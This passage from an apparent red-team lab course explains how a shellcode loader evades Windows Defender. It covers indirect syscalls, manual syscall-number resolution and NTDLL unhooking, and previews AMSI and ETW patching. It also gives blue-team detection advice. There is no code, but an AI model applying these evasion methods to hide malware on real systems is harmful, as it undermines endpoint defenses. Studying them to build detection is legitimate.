Three layers are still active but not catching you at default sensitivity:

- AMSI: still running, but the shellcode is in unmanaged memory
- ETW: still logging events, but the pattern is not triggering alerts
- API hooks: still present in ntdll.dll, but not triggering on this specific call pattern

Documents 08, 09, and 10 address these remaining layers for maximum stealth.

## Common Threats and Variations

### Variation 1: Indirect Syscalls

Loader 03 calls NT functions through ntdll.dll using GetProcAddress. An advanced variation is indirect syscalls, where you find the `syscall` instruction inside ntdll.dll and jump to it from your own code. The benefit is that the call stack shows the return address inside ntdll.dll, which looks legitimate to any EDR that walks the call stack.

The difference: regular dynamic resolution calls the function from the beginning, going through any hooks. Indirect syscalls skip to the `syscall` instruction itself, avoiding the hook entirely. This is more evasive but also more complex to implement.

Loader 03 does not use true indirect syscalls, but the SysWhispers3 and SysWhispers4 tools referenced in the loader's header can generate C# code that does. For most Defender-only scenarios (no third-party EDR), the dynamic resolution approach in Loader 03 is sufficient.

### Variation 2: Manual Syscall Number Resolution

Instead of using GetProcAddress to call the ntdll.dll function, you can read the syscall number from ntdll.dll's code in memory (the `mov eax, XX` instruction near the beginning of each function) and issue the `syscall` instruction directly from your own code using assembly.

The benefit: your code never calls any ntdll.dll function, so hooks at the function entry point are bypassed completely. The risk: syscall numbers change between Windows versions. Number 0x18 for NtAllocateVirtualMemory on one build might be different on another build. If you hardcode the wrong number, the call fails or crashes.

Tools like SysWhispers solve this by reading the syscall numbers from ntdll.dll at runtime, getting the correct values for the current Windows version.

### Variation 3: Fresh NTDLL Copy

Defender's hooks modify ntdll.dll in your process's memory. Another evasion approach is to load a fresh, unhooked copy of ntdll.dll from disk. The copy on disk has no hooks. You map it into your process's memory at a different address and call functions from the clean copy.

This is called NTDLL unhooking and is covered conceptually in Document 10 (Combined Evasion).

## Detection and Defense (Blue Team Perspective)

**Monitor GetProcAddress calls that resolve NT functions.** A legitimate program calling GetProcAddress for NtAllocateVirtualMemory or NtCreateThreadEx is unusual. Most programs use the kernel32 wrappers. An EDR that logs GetProcAddress calls and checks which function names are being resolved can detect this technique.

Blue team action: configure your EDR to alert when GetProcAddress resolves NT-level function names (any function starting with "Nt" or "Zw" in ntdll.dll).

**Use kernel-level monitoring instead of user-mode hooks.** Defender's user-mode hooks in ntdll.dll can be bypassed by dynamic resolution, indirect syscalls, or NTDLL unhooking. Kernel-level monitoring (using Windows kernel callbacks) cannot be bypassed from user mode because the monitoring code runs in the kernel itself.

Blue team action: deploy EDR products that use kernel callbacks (PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine, ObRegisterCallbacks) in addition to user-mode hooks. These kernel callbacks fire regardless of how the API was called.

**Watch for two-step memory protection changes.** A process that allocates memory as RW, writes to it, then changes the protection to RX is performing just-in-time compilation or code injection. While JIT compilers (like .NET itself) do this legitimately, an unknown binary doing it is suspicious.

Blue team action: alert on VirtualProtect/NtProtectVirtualMemory calls that change memory from writable to executable, especially from binaries that are not .NET runtime components or known JIT compilers.

**Deploy application whitelisting.** None of these evasion techniques work if the binary is not allowed to run in the first place. Windows Defender Application Control (WDAC) or AppLocker can restrict which binaries execute to a pre-approved list. A custom-compiled loader will not be on the list.

Blue team action: implement application whitelisting in production environments. Only signed, known binaries should be permitted to run.

## What Comes Next

Document 08 (lab/materials/08_amsi_bypass.md) addresses two more detection layers: AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows). AMSI scans .NET code at runtime, and ETW logs process behavior events. Document 08 teaches Loader 04 (AMSI patching) and Loader 07 (ETW patching), which disable both systems before your shellcode runs. Combined with the dynamic resolution from Loader 03, this gives you a loader that bypasses five of Defender's six detection layers.
